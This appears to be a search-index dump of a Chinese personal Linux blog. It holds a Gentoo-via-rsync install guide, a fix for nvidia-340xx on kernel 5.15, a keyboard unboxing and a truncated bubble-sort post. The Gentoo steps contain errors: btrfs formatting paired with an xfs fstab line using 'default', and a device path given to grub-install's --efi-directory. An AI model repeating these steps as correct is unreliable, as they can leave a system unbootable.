ChromeBook， 2GB 的 RAM 和一颗 只有 2.6 GHz 的双核老低压 U 对于现在的流行发行版来说已经完全不够用了，目前跑个 Mint 也是 CPU 经常性的 100% 占用。 于是我想着能不能给他装个 Gentoo？ 然而就这乌龟U，估计得连续开机一周才能编译完吧… 嗯，不过我想试试能不能通过台式机编译完 Gentoo 再通过 rsync 给它传输到 ChromeBook。 论编译，我感觉哪怕是在 2022 年 E3 神教也不会让我失望吧。 起码比这颗小赛扬快多了。 准备工作 废话不多说，直接开搞。 但我们要准备好这些东西 Gentoo Wiki 安装过程中需要用到官方的指引和文档，必备 翻译工具 由于 Gentoo 的用户群体较小，文档汉化可能不是很全面，因此可以借助翻译工具，这里推荐 deepl 一个 U 盘 用来装一个临时的 Linux 作为笔记本的 rsync 接收端。 这个没什么好说的，最好支持 USB 3.0～ 下载好 Gentoo 官方提供的 stage 包 这个会在下文中写出过程 一个能够操作的 Linux 终端 下载 stage 压缩包 由于我们的安装手段比较特殊，因此可以直接跳到官方 wiki 的这一步 按照官方 wiki 给出的文档，我们进行以下操作: 首先开启 root weepingdogel $ sudo -i 接下来，你可以挂载一个分区到 mnt ，也可以直接创建文件夹，我这边空间很充足就直接空载操作了。 至于如何挂载？可以去参考 Arch Wiki。 root # cd /mnt/gentoo 然后我们需要用 wget 下载 stage 包，打开这个页面，这里我们选择 stage3 因为我懒，喜欢用 systemd ， 可以根据需要选择。 注意：右键 stage3 systemd ，复制链接 将链接粘贴到终端上 root # wget https://bouncer.gentoo.org/fetch/root/all/releases/amd64/autobuilds/20220605T170549Z/stage3-amd64-systemd-20220605T170549Z.tar.xz 等待下载。 下载完成之后可以进行一下文件校验，可以参考一下官方的这个条目 一般情况下我这边不会损坏，所以我这里就不写出来了，接下来我们直接进入解压 stage 文件这一步。 解压 stage 压缩包 我们使用 tar 来进行解压，这是官方 wiki 给出的命令： root #tar xpvf stage3-*.tar.bz2 --xattrs-include='*.*' --numeric-owner 有些读者可能看不懂中间那一串，那一串其实是个通配符，不过这个通配符可能跟你下载到的文件不一样，因此我们将中间那段改成准确的文件名。 这一步操作很简单，只需要按一下 Tab 键即可。 root # tar xpvf stage3-amd64-systemd-20220102T170545Z.tar.xz --xattrs-include='*.*' --numeric-owner 等待解压，一会儿就好，除非你用 IDE 硬盘。 配置编译选项 这一步官方是这么解释的： 为了优化Gentoo，可以设置一些影响Portage的变量，Gentoo官方支持包管理器。 所有这些变量可以设置为环境变量（使用export），但这不是永久的。 为了保留设置，Portage读入/etc/portage/make.conf文件 ，一个用于Portage的配置文件。 附注 所有可能的变量的注释列表可以在 /mnt/gentoo/usr/share/portage/config/make.conf.example中找到。要成功安装Gentoo，只需要设置下面提到的变量。 启动编辑器（在本指南中，我们使用 nano）来更改我们将在下面讨论的优化变量。 root #nano -w /mnt/gentoo/etc/portage/make.conf 从make.conf.example文件中可以明显看出文件的结构：注释行以 “#“开头，其他行使用 VARIABLE=“content 语法定义变量。 接下来选取其中的几个进行讨论。 这里我们用 vim 写一下 root # vim /mnt/gentoo/etc/portage/make.conf 将里面的 COMMON_FLAGS= 加入 -march=silvermont 的选项，这样就能让编译器给 silvermont 架构的垃圾 CPU 进行优化了。 完整文件如下： # These settings were set by the catalyst build script that automatically # built this stage. # Please consult /usr/share/portage/config/make.conf.example for a more # detailed example. COMMON_FLAGS=\"-march=silvermont -O2 -pipe\" CFLAGS=\"${COMMON_FLAGS}\" CXXFLAGS=\"${COMMON_FLAGS}\" FCFLAGS=\"${COMMON_FLAGS}\" FFLAGS=\"${COMMON_FLAGS}\" # NOTE: This stage was built with the bindist Use flag enabled PORTDIR=\"/var/db/repos/gentoo\" DISTDIR=\"/var/cache/distfiles\" PKGDIR=\"/var/cache/binpkgs\" # This sets the language of build output to English. # Please keep this setting intact when reporting bugs. LC_MESSAGES=C 安装 Gentoo 基础系统 上面已经完成了第一阶段的操作，可以开始安装基本系统了，诶嘿嘿。 接下来要做的是选择镜像源，我们可以参考 ustc mirror 给出的帮助文档： Gentoo 源使用帮助 — USTC Mirror Help 文档 Gentoo Portage 源使用帮助 — USTC Mirror Help 文档 直接按照 ustc 给出的帮助设置这两个源地址就好啦～ 然后复制 DNS 信息 root # cp --dereference /etc/resolv.conf /mnt/gentoo/etc/ ","date":"2022-06-11","objectID":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/:0:0","tags":["Gentoo","rsync","教程","尝试","编译","安装"],"title":"利用 rsync 给笔记本安装 Gentoo","uri":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/"},{"categories":["Linux"],"content":"挂载必要的文件系统 这里要注意一下了，我这边要打好几条命令 Why？ 官方的解释： 稍等片刻，Linux 的根目录将变更到新的位置。为了确保新环境正常工作，需要确保一些文件系统可以正常使用。 需要提供的文件系统是： /proc/ 一个pseudo文件系统（看起来像是常规文件，事实上却是实时生成的），由Linux内核暴露的一些环境信息 /sys/ 一个pseudo文件系统，像要被取代的/proc/一样，比/proc/更加有结构 /dev/ 是一个包含全部设备文件的常规文件系统，一部分由Linux设备管理器（通常是udev）管理 /proc/位置将要挂载到/mnt/gentoo/proc/，而其它的两个都是绑定挂载。字面上的意思是，例如/mnt/gentoo/sys/事实上就是/sys/（它只是同一个文件系统的第二个条目点），而/mnt/gentoo/proc/是（可以说是）文件系统的一个新的挂载。 因此按顺序执行以下命令进行挂载： root # mount --types proc /proc /mnt/gentoo/proc root # mount --rbind /sys /mnt/gentoo/sys root # mount --make-rslave /mnt/gentoo/sys root # mount --rbind /dev /mnt/gentoo/dev root # mount --make-rslave /mnt/gentoo/dev 然而，这还没完 因此，接下来要加上这三条 root # test -L /dev/shm \u0026\u0026 rm /dev/shm \u0026\u0026 mkdir /dev/shm root # mount --types tmpfs --options nosuid,nodev,noexec shm /dev/shm root # chmod 1777 /dev/shm ","date":"2022-06-11","objectID":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/:1:0","tags":["Gentoo","rsync","教程","尝试","编译","安装"],"title":"利用 rsync 给笔记本安装 Gentoo","uri":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/"},{"categories":["Linux"],"content":"Chroot : 进入新环境 当挂载好一切后，就可以 chroot 进去了 root # chroot /mnt/gentoo /bin/bash root # source /etc/profile root # export PS1=\"(chroot) ${PS1}\" 接下来终端会变成这样 ","date":"2022-06-11","objectID":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/:2:0","tags":["Gentoo","rsync","教程","尝试","编译","安装"],"title":"利用 rsync 给笔记本安装 Gentoo","uri":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/"},{"categories":["Linux"],"content":"挂载 boot 分区 这一步我们直接略过，因为最终安装的设备不是本机，而是另一台笔记本。 之后我们再进行手动安装引导介质。 ","date":"2022-06-11","objectID":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/:3:0","tags":["Gentoo","rsync","教程","尝试","编译","安装"],"title":"利用 rsync 给笔记本安装 Gentoo","uri":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/"},{"categories":["Linux"],"content":"从网站安装 Gentoo ebuild 数据库快照 官方其实这个就相当于 Arch 里面的 sudo pacman -Syyu 不多说，复制粘贴吧。 root # emerge-webrsync ","date":"2022-06-11","objectID":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/:4:0","tags":["Gentoo","rsync","教程","尝试","编译","安装"],"title":"利用 rsync 给笔记本安装 Gentoo","uri":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/"},{"categories":["Linux"],"content":"选择配置文件 我怎么感觉像是在复制 wiki 的内容呢… 配置文件是任何一个Gentoo系统的积木。它不仅指定USE、CFLAGS和其它重要变量的默认值，还会锁定系统的包版本范围。这些设定全是由Gentoo的Portage开发者们来维护。 # eselect profile list Available profile symlink targets: [1] default/linux/amd64/17.1 * [2] default/linux/amd64/17.1/desktop [3] default/linux/amd64/17.1/desktop/gnome [4] default/linux/amd64/17.1/desktop/kde 然后输入以下命令即可： # eselect profile set [对应的数字] 其实它会列出很多选项，我们需要选择含有 desktop/system 的版本 ","date":"2022-06-11","objectID":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/:5:0","tags":["Gentoo","rsync","教程","尝试","编译","安装"],"title":"利用 rsync 给笔记本安装 Gentoo","uri":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/"},{"categories":["Linux"],"content":"设置时区 这里直接用 Arch 的方法 # ln -sf /usr/share/zoneinfo/Region（地区名）/City（城市名） /etc/localtime 根据我的情况，我应该这样写： # ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 然后运行 hwclock 以生成 /etc/adjtime： # hwclock --systohc ","date":"2022-06-11","objectID":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/:6:0","tags":["Gentoo","rsync","教程","尝试","编译","安装"],"title":"利用 rsync 给笔记本安装 Gentoo","uri":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/"},{"categories":["Linux"],"content":"设置 USE 对于 Gentoo 这个系统来说， USE 标记是必备的，因此在编译之前，我们需要设置好全局 USE 标记 # vim /etc/portage/make.conf USE=\"alsa udev dbus icu systemd gles2 sound video intel -kde tiff x265\" VIDEO_CARDS=\"intel\" ","date":"2022-06-11","objectID":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/:7:0","tags":["Gentoo","rsync","教程","尝试","编译","安装"],"title":"利用 rsync 给笔记本安装 Gentoo","uri":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/"},{"categories":["Linux"],"content":"更新 @world 集合 其实就是跟 Arch 的“滚”差不多，但是它会是一个比较漫长的过程。 # emerge --ask --verbose --update --deep --newuse @world 除此之外，在更改USE标记之后，这条命令也用来动态调整系统功能。 ","date":"2022-06-11","objectID":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/:8:0","tags":["Gentoo","rsync","教程","尝试","编译","安装"],"title":"利用 rsync 给笔记本安装 Gentoo","uri":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/"},{"categories":["Linux"],"content":"配置 locale 麻了，参考这个 Installation guide (简体中文) - ArchWiki 配置内核 嗯哼，你以为我那么傻又编译八个小时？不！这次我选择用 bin 内核！ # emerge --ask sys-kernel/installkernel-systemd-boot 节省不少时间呢。 # emerge --ask sys-kernel/gentoo-kernel-bin 哎呀不想写了… 写了都是复制粘贴 自己看吧 安装固件 一些驱动需要先在系统上安装附加的固件才能工作。经常网络接口上会使用，特别是无线网络接口。此外，来自 AMD 、 NVidia 和 Intel 等供应商的现代视频芯片在使用开源驱动程序时，通常也需要外部固件文件。大多数固件都打包在 sys-kernel/linux-firmware 里 大多数设备的驱动都依赖于 linux-firmware 这个包 # emerge --ask sys-kernel/linux-firmware 配置 fstab 这一步操作是在系统启动的时候，让内核认识分区 但是 Gentoo 好像不能用 genfstab 只能手写了 先在笔记本获取 UUID ls /dev/disk/by-uuid/ -l 接下来将 / 分区对应分区的 UUID 按如下格式写在 /etc/fstab 这个文件里面 # /dev/mmcblk1p2 UUID=xxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx / xfs default,rw,relatime 0 1 通过 rsync 将系统灌到笔记本上 这个时候需要给笔记本插入一个 ArchISO 的 U 盘，启动到 ISO，并连接 WIFI 和 开启 ssh 服务。 接下来将其原有的分区格式化 # mkfs.btrfs /dev/mmcblk1p2 -f 然后挂载它，并将刚刚做好的文件用 rsync 灌进去 # mount /dev/mmcblk1p2 /mnt 接下来笔记本这一端开启 ssh 服务 # systemctl start sshd 然后使用 rsync 将编译好的文件传输至笔记本的系统分区。 # rsync -aAXHv -P -vi --exclude={\"/dev/*\",\"/proc/*\",\"/sys/*\",\"/tmp/*\",\"/run/*\",\"/mnt/*\",\"/media/*\",\"/lost+found\"} ./mnt/gentoo/. root@192.168.0.109:/mnt 在笔记本安装启动引导器 这个也是很熟悉的操作了。 # grub-install --target=x86_64-efi --efi-directory=/dev/mmcblk1p1 --bootloader-id=GRUB # grub-mkconfig -o /boot/grub/grub.cfg 结语 通过一系列的折腾，这台老本子终于能发挥其最大的性能了。 由此看来通过 rsync 复制 Linux 发行版系统文件到其他的设备看起来是可行的。 不过也折腾了挺久的 参考链接 Gentoo Wiki Downloads â Gentoo Linux 安装Gentoo安装文件 - Gentoo Wiki Gentoo 源使用帮助 — USTC Mirror Help 文档 Gentoo Portage 源使用帮助 — USTC Mirror Help 文档 Installation guide (简体中文) - ArchWiki ","date":"2022-06-11","objectID":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/:9:0","tags":["Gentoo","rsync","教程","尝试","编译","安装"],"title":"利用 rsync 给笔记本安装 Gentoo","uri":"/zh-cn/posts/%E5%88%A9%E7%94%A8rsync%E7%BB%99%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%AE%89%E8%A3%85gentoo/"},{"categories":null,"content":"Fuck you! Nvidia!!","date":"2021-11-22","objectID":"/zh-cn/posts/%E5%85%B3%E4%BA%8En%E5%8D%A1%E9%97%AD%E6%BA%90%E9%A9%B1%E5%8A%A8nvidia-340xx%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85%E8%BF%99%E6%A1%A3%E5%AD%90%E4%BA%8B/","tags":null,"title":"关于N卡闭源驱动 nvidia-340xx 无法安装这档子事","uri":"/zh-cn/posts/%E5%85%B3%E4%BA%8En%E5%8D%A1%E9%97%AD%E6%BA%90%E9%A9%B1%E5%8A%A8nvidia-340xx%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85%E8%BF%99%E6%A1%A3%E5%AD%90%E4%BA%8B/"},{"categories":null,"content":"序 首先容我说一句 FUCK YOU NVIDIA! 由于我现在时间比较少，Arch 经常好几天不滚，前两天滚了一下，驱动炸了 内核更新到了 5.15.3 一开始我觉得问题不大，更新一下就好了 于是我就 $ yay -S nvidia-340xx 但是没想到，它给我来这一出 呜呜呜！！！为什么编译不出来！！！ 黄仁勋 NMSL!!! 解决过程 咳咳，尽管如此我还是花了一天的时间冷静了下来，然后开始试试看手动 makepkg 行不行。 按照惯例我应该去 aur 把 PKGBUILD 给 git 下来。 不过正当我打开 nvidia-340xx 这个包的 aur 界面时，我在评论那里看到了这句话。 Users of this package should block automatic update of their kernel. There is not enough man power to update it as fast as newer kernels are released. 康不懂嘤语？ 给你翻译一下 这个软件包的用户应该阻止其内核的自动更新。没有足够的人力来更新它，因为更新内核的速度太快了。 我当场就想说 FUCK YOU NVIDIA! 然后我就想着要不用回旧版本的内核？一边想一边往下翻，我就又看到了一条对我有用的评论 Patch for kernel 5.15 https://pastebin.com/uYP9J2Cw Found here https://github.com/warpme/minimyth2/issues/15 然后我观察了一下这个包的文件目录.. . ├── 0001-kernel-5.7.patch ├── 0002-kernel-5.8.patch ├── 0003-kernel-5.9.patch ├── 0004-kernel-5.10.patch ├── 0005-kernel-5.11.patch ├── 0006-kernel-5.14.patch ├── 20-nvidia.conf ├── nvidia-340xx.install └── PKGBUILD 0 directories, 9 files 虽然我不太懂，但我发现这个 *.patch 文件的文件名似乎对应着各个内核版本。 而这条评论给出了新 patch 文件的链接，以及一个 issue 链接。 我瞬间知道怎么回事了，打包所需的文件是更新了，但还没有提交到 aur.. 淦，我只能自己试试看了 于是抱着试试看的态度 我打开了它的 PKGBUILD pkgbase=nvidia-340xx pkgname=(nvidia-340xx nvidia-340xx-dkms); [ -n \"$NVIDIA_340XX_DKMS_ONLY\" ] \u0026\u0026 pkgname=(nvidia-340xx-dkms) pkgver=340.108 pkgrel=25 pkgdesc=\"NVIDIA drivers for linux, 340xx legacy branch\" arch=('x86_64') url=\"https://www.nvidia.com/\" makedepends=(\"nvidia-340xx-utils=${pkgver}\" 'linux\u003e=5.5' 'linux-headers\u003e=5.5') conflicts=('nvidia') license=('custom') options=(!strip) # https://github.com/warpme/minimyth2/tree/master/script/nvidia/nvidia-340.108/files source=(\"https://us.download.nvidia.com/XFree86/Linux-x86_64/${pkgver}/NVIDIA-Linux-x86_64-${pkgver}-no-compat32.run\" 20-nvidia.conf 0001-kernel-5.7.patch 0002-kernel-5.8.patch 0003-kernel-5.9.patch 0004-kernel-5.10.patch 0005-kernel-5.11.patch 0006-kernel-5.14.patch ) 确实发现了这么一行文件，我在想，是不是把这个新的文件下下来，放到编译目录然后在这个列表加上就能编译了？ 于是我把这个文件下载了下来，放进了编译目录 （具体过程就略过了，都是 wget cp cd 之类的事情） 并且把文件名加上了 source=(\"https://us.download.nvidia.com/XFree86/Linux-x86_64/${pkgver}/NVIDIA-Linux-x86_64-${pkgver}-no-compat32.run\" 20-nvidia.conf 0001-kernel-5.7.patch 0002-kernel-5.8.patch 0003-kernel-5.9.patch 0004-kernel-5.10.patch 0005-kernel-5.11.patch 0006-kernel-5.14.patch 0007-kernel-5.15.patch ) 接下来 $ makepkg 不过很快我就收到了报错 ==\u003e 正在创建软件包：nvidia-340xx 340.108-25 (Mon 22 Nov 2021 02:08:12 PM CST) ==\u003e 正在检查运行时依赖关系... ==\u003e 正在检查编译时依赖关系 ==\u003e 获取源代码... -\u003e 找到 NVIDIA-Linux-x86_64-340.108-no-compat32.run -\u003e 找到 20-nvidia.conf -\u003e 找到 0001-kernel-5.7.patch -\u003e 找到 0002-kernel-5.8.patch -\u003e 找到 0003-kernel-5.9.patch -\u003e 找到 0004-kernel-5.10.patch -\u003e 找到 0005-kernel-5.11.patch -\u003e 找到 0006-kernel-5.14.patch -\u003e 找到 0007-kernel-5.15.patch ==\u003e 错误： 对这些文件的完整性检查缺失: source 然后我试了一下重新生成校验码 makepkg -g 然后把返回来的数据复制粘贴进 PKGBUILD (注意，返回内容不唯一) b2sums=('6538bbec53b10f8d20977f9b462052625742e9709ef06e24cf2e55de5d0c55f1620a4bb21396cfd89ebc54c32f921ea17e3e47eaa95abcbc24ecbd144fb89028' '49d99f612e8eee3ab5e34083c25348bfd14ed5fc8a7984dafc0dad7c0ae0df2c0b2a63a1bb993da440eb0a60293d7c753ca3889bd2f51991b8ddc51bce2fe4a8' '7150233df867a55f57aa5e798b9c7618329d98459fecc35c4acfad2e9772236cb229703c4fa072381c509279d0588173d65f46297231f4d3bfc65a1ef52e65b1' 'b436095b89d6e294995651a3680ff18b5af5e91582c3f1ec9b7b63be9282497f54f9bf9be3997a5af30eec9b8548f25ec5235d969ac00a667a9cddece63d8896' '947cb1f149b2db9c3c4f973f285d389790f73fc8c8a6865fc5b78d6a782f49513aa565de5c82a81c07515f1164e0e222d26c8212a14cf016e387bcc523e3fcb1' '665bf0e1fa22119592e7c75ff40f265e919955f228a3e3e3ebd76e9dffa5226bece5eb032922eb2c009572b31b28e80cd89656f5d0a4ad592277edd98967e68f' '344cd3a9888a9a61941906c198d3a480ce230119c96c72c72a74b711d23face2a7b1e53b9b4639465809b84762cdc53f38210e740318866705241bc4216e4f35' '31a4047ab84d13e32fd7fdbf9f69c696d3fab6666c541d2acf0a189c1d17c876970985167fd389a4adc0f786021172bdec1aa6d690736e3cf9fcd8ceabe5fd32' 'a26426488f6e105f546e091ce4d2e9587cc41a0fb05b0dffeb1c523d8d06782bda3004352655c9c019224091f7bc7903939e53ede73f64553f14be8e8a47793a') 接下来再次执行 makepkg 就能成功编译了 接下来用 pacman 装上 sudo pacma","date":"2021-11-22","objectID":"/zh-cn/posts/%E5%85%B3%E4%BA%8En%E5%8D%A1%E9%97%AD%E6%BA%90%E9%A9%B1%E5%8A%A8nvidia-340xx%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85%E8%BF%99%E6%A1%A3%E5%AD%90%E4%BA%8B/:0:0","tags":null,"title":"关于N卡闭源驱动 nvidia-340xx 无法安装这档子事","uri":"/zh-cn/posts/%E5%85%B3%E4%BA%8En%E5%8D%A1%E9%97%AD%E6%BA%90%E9%A9%B1%E5%8A%A8nvidia-340xx%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85%E8%BF%99%E6%A1%A3%E5%AD%90%E4%BA%8B/"},{"categories":null,"content":"现在在夜间模式下也能正常读评论了，好耶。","date":"2021-09-25","objectID":"/zh-cn/posts/%E5%B7%B2%E5%B0%86%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%E6%8D%A2%E6%88%90utterances/","tags":["Gitalk","Utterances"],"title":"已将评论系统换成 Utterances","uri":"/zh-cn/posts/%E5%B7%B2%E5%B0%86%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%E6%8D%A2%E6%88%90utterances/"},{"categories":null,"content":"之前都是使用 Gitalk 做评论系统的，但是 Diary 主题在夜间模式下对 Gitalk 的显示有 bug。 目前开发者也在修复中 ","date":"2021-09-25","objectID":"/zh-cn/posts/%E5%B7%B2%E5%B0%86%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%E6%8D%A2%E6%88%90utterances/:0:0","tags":["Gitalk","Utterances"],"title":"已将评论系统换成 Utterances","uri":"/zh-cn/posts/%E5%B7%B2%E5%B0%86%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%E6%8D%A2%E6%88%90utterances/"},{"categories":["开箱"],"content":"一把低调奢华有内涵的机械键盘。","date":"2021-08-30","objectID":"/zh-cn/posts/%E7%BD%97%E6%8A%80k845%E5%BC%80%E7%AE%B1/","tags":["罗技","键盘","开箱","体验","机械键盘"],"title":"罗技 K845 开箱","uri":"/zh-cn/posts/%E7%BD%97%E6%8A%80k845%E5%BC%80%E7%AE%B1/"},{"categories":["开箱"],"content":"序 注意，这不是专业详细的评测，只是个人的开箱体验感受 关注我 tg 频道的读者可能知道，之前我一直在考虑入手一把机械键盘。最终我选择了罗技的 k845。 昨天下午收到了快递代收点发来的到货短信，它终于来了，内心同时存在两种感觉：一个是键盘来了的欢喜，一个是暂时无法去取快递的尴尬。 今天返城到家，一下车我就迫不及待的跑去拿快递。 包了一层塑料纸和一层瓦楞纸，但是没有泡泡纸，不能戳戳戳了。 QAQ 多重？据说这个键盘不太重，连包装一起… 大概和一瓶 2L 的可乐差不多吧.. 包装与外观 一跑回家就开始拆快递了，带着一点点急切和一点点期待….. Emmmm….. 就打开了… 啊这，罗技作为一个大品牌怎么可以这么抠啊 嗯… 简约低调朴实无华的牛皮纸外包装，完美地体现了罗技的环保品牌形象！ 密封方式照样也很简约环保，沾了一层透明的胶，只需要简简单单的用指甲划开，就能打开盒子了。 打开盒子之后，里面直接就是一把键盘，啥都没有… 这环保，简直做到了极致啊。堪比某果不送充电器～ 不过包装并不能代表什么，罗技这样的大厂肯定是把预算都花在了品质上。 没有泡沫绵缓冲这个事实就表明了罗技对键盘的可靠性充满了自信，这是一项加分项。 键盘采用悬浮式设计，银色磨砂外观的铝制底板，一股商务风扑面而来 图片是我直接上机点亮后拍的，不得不说这个灯光确实跟我想象的一样，在房间开灯的时候键盘上的灯光跟几乎没有一样.. 很微弱。 于是我就关上了灯，想看看它在关灯的时候是什么效果。 嗯.. 亮度刚刚好，不刺眼，正好适合晚上偷偷的写代码嘿嘿～ （照片看上去可能很亮，但实际上并没有图上那么刺眼。） 键冒的话.. 是 ABS 黑色键冒，配上这个白色的背光.. 感觉有点性冷淡的感觉，233 如果把键冒换成粉色的就完美了，嘿嘿 然后右上角有三个指示灯，分别是数字键、大小写、滚动锁定，这样传统的设计还是比较适合我的。qwq 背后有两个脚架，打开之后大概是这样 我个人是很喜欢打开脚架的，不过打开这个脚架需要稍微用一点力，打开之后的高度差也不是很大，正好适合狗爪子（bushi）。 手感 日常打字的话，概括一下： 清脆的声音很带感，嘿嘿。 qwq 但是造成的噪音也很大，毕竟青轴号称室友快乐轴嘛～ 但是我喜欢 （逃 青轴的触感很强，段落感很到位～ 长期输入的情况下都不会疲劳。 游戏方面，我玩了会 Minecraft ，对比薄膜差异还是很大的 QAQ，但平时也很少玩其他游戏了。 总的来说比薄膜强太多了，我可能回不去了。 QAQ 希望它能够耐用吧，毕竟它是我的第一把机械键盘。 总结 这个键盘，244，值！ 耐用程度上我是看好它的，打算用个四年五年的应该没问题（？） 虽然这个价位的它没有炫酷的 RGB，没有键线分离，音乐律动这些花里胡哨的东西… （然而作为 Arch 用户的我连驱动都不想装，嗯，它也没驱动） 但是其他方面足够满足我的需求，柔和的背光和优秀的按键触感让我觉得这两百多花得也值了。 嗯… 如果有空的话把键冒换成粉色（逃 ","date":"2021-08-30","objectID":"/zh-cn/posts/%E7%BD%97%E6%8A%80k845%E5%BC%80%E7%AE%B1/:0:0","tags":["罗技","键盘","开箱","体验","机械键盘"],"title":"罗技 K845 开箱","uri":"/zh-cn/posts/%E7%BD%97%E6%8A%80k845%E5%BC%80%E7%AE%B1/"},{"categories":["编程"],"content":"分别用 Python 和 C 实现冒泡排序。","date":"2021-06-15","objectID":"/zh-cn/posts/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%9A%84%E5%B0%9D%E8%AF%95/","tags":["C语言","Python","编程","冒泡排序","排序算法"],"title":"冒泡排序的尝试","uri":"/zh-cn/posts/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%9A%84%E5%B0%9D%E8%AF%95/"},{"categories":["编程"],"content":"序 嗯.. 又遇到了一个题 输入4个整数，从小到大排序 哇这个.. 看似简单其实写起来可不轻松呢。 我照着谷歌查到的教程写了两种办法.. 一个是指针交换法 drafts/swap_sort.c at main · WeepingDogel/drafts · GitHub 另一个是冒泡排序 drafts/bbsort.c at main · WeepingDogel/drafts · GitHub 本文将会描述用冒泡排序法解这个题 冒泡排序 什么是冒泡排序？ 冒泡排序（英语：Bubble Sort）又称为泡式排序，是一种简单的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果他们的顺序错误就把他们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。 ——冒泡排序 - 维基百科，自由的百科全书 嗯… 冒泡排序的过程是啥？ 比较相邻的元素。如果第一个比第二个大，就交换他们两个。 对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。 针对所有的元素重复以上的步骤，除了最后一个。 持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。 ——冒泡排序 - 维基百科，自由的百科全书 再来看看维基百科上的伪代码和助记码 function bubble_sort (array, length) { var i, j; for(i from 0 to length-1){ for(j from 0 to length-1-i){ if (array[j] \u003e array[j+1]) swap(array[j], array[j+1]) } } } 函数 冒泡排序 输入 一个数组名称为array 其长度为length i 从 0 到 (length - 1) j 从 0 到 (length - 1 - i) 如果 array[j] \u003e array[j + 1] 交换 array[j] 和 array[j + 1] 的值 如果结束 j循环结束 i循环结束 函数结束 助记码 i∈[0,N-1) //循环N-1遍 j∈[0,N-1-i) //每遍循环要处理的无序部分 swap(j,j+1) //两两排序（升序/降序） 看完之后其实不难理解，变量i和j其实是用来定位元素在数组中的位置，然后通过循环增减来进行比较，如果其中一个比另一个大就更换位置。 j 的 for 循环每循环一次比对交换一次，i 的 for 循环每循环一次执行一次 j 的 for 循环，周而复始，直到循环结束就已经没有任何一对数字需要比较。 接下来我将分别使用 Python 和 C 语言来实现冒泡了算法以及题目的需求。 过程 ","date":"2021-06-15","objectID":"/zh-cn/posts/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%9A%84%E5%B0%9D%E8%AF%95/:0:0","tags":["C语言","Python","编程","冒泡排序","排序算法"],"title":"冒泡排序的尝试","uri":"/zh-cn/posts/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%9A%84%E5%B0%9D%E8%AF%95/"},{"categories":["编程"],"content":"Python 首先用 Python 试试看。 先声明变量 sort()，规定参数 arr 来表示数组: def sort(arr): 设置变量 i 和 j, 并用 for 从 i 开始循环arr的长度-1遍: for i in 